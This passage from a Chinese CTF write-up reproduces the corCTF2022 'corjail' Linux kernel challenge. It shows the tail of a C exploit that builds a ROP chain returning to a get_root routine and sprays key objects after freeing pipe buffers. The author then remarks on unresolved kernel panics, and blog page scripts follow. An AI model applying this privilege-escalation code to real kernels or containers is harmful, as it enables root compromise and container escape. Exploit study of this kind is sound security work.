magic_rop[index++] = MOV_RAX_RBX_POP_4 + kernel_offset;<br>    magic_rop[index++] = <span class="hljs-number">0xdeadbeef</span>;<br>    magic_rop[index++] = <span class="hljs-number">0xdeadbeef</span>;<br>    magic_rop[index++] = <span class="hljs-number">0xdeadbeef</span>;<br>    magic_rop[index++] = <span class="hljs-number">0xdeadbeef</span>;<br><br>    magic_rop[index++] = SWAPGS_RESTORE_AND_RETURN_TO_USERMDOE + kernel_offset;<br>    magic_rop[index++] = <span class="hljs-number">0xdeadbeef</span>;<br>    magic_rop[index++] = <span class="hljs-number">0xdeadbeef</span>;<br>    magic_rop[index++] = (<span class="hljs-type">size_t</span>)get_root;   <br>    magic_rop[index++] = user_cs;   <br>    magic_rop[index++] = user_rflags;   <br>    magic_rop[index++] = user_sp + <span class="hljs-number">8</span>;   <br>    magic_rop[index++] = user_ss;   <br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]Done!&quot;</span>);<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30</span>; i++)&#123;<br>        <span class="hljs-built_in">sprintf</span>(description, <span class="hljs-string">&quot;payload_%d&quot;</span>, i);<br>        key_id[i] = key_alloc(description, data, <span class="hljs-number">0x200</span>);<br>        <span class="hljs-keyword">if</span>(key_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[X]key_%d alloc failed!&quot;</span>, i);<br>            error_log(<span class="hljs-string">&quot;key_alloc failed&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Release the whole pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x400</span>; i++)&#123;<br>        close(pipe_id[i][<span class="hljs-number">1</span>]);<br>        close(pipe_id[i][<span class="hljs-number">0</span>]);<br>    &#125;<br> &#125;<br></code></pre></td></tr></table></figure>

<p>其中有个很大的问题就是经常内核panic会报这两种错误</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/adaf2edda3cc7cd9b298f5ed7f01213fb80e9149.jpg" srcset="/img/loading.gif" lazyload></p>
<p>初步分析是poll在最后时间到返回的时候报错，没调出来:(</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/3ac79f3df8dcd10033313915348b4710b9122f51.jpg" srcset="/img/loading.gif" lazyload></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CTFwp/" class="category-chain-item">CTFwp</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/PWN/">#PWN</a>
      
        <a href="/tags/Linux/">#Linux</a>
      
        <a href="/tags/Kernel/">#Kernel</a>
      
        <a href="/tags/docker-escape/">#docker escape</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>corCTF2022-corjail赛题复现</div>
      <div>https://peiandhao.github.io/2024/01/08/corCTF2022-corjail/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>peiwithhao</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年1月8日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/02/06/eBPF-Redemption/" title="eBPF:Redemption">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">eBPF:Redemption</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/01/07/CVE-2016-5195/" title="CVE-2016-5195漏洞复现">
                        <span class="hidden-mobile">CVE-2016-5195漏洞复现</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"Afm6UeM0VL6RfMOLAgwtyxs8-gzGzoHsz","appKey":"Vr60qrZIptqhJaXqWvDEknkH","path":"window.location.pathname","placeholder":"锐评一下","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <div> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Pei</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Hao</span></a> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>




  
<script src="/js/DynamicLine.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
